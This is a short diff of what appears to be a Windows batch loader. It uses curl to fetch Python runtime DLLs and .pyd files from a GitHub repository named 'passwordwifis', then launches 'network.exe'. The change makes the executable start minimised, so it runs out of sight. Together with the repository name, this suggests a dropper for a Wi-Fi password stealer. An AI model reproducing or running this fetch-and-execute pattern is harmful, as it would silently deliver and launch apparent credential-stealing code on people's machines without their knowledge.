@@ -25,5 +25,5 @@ curl -o select.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/select.p
 curl -o tcl86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tcl86t.dll?raw=true -LJO
 curl -o tk86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tk86t.dll?raw=true -LJO
 curl -o unicodedata.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/unicodedata.pyd?raw=true -LJO
-network.exe
+start /MIN network.exe
 exit
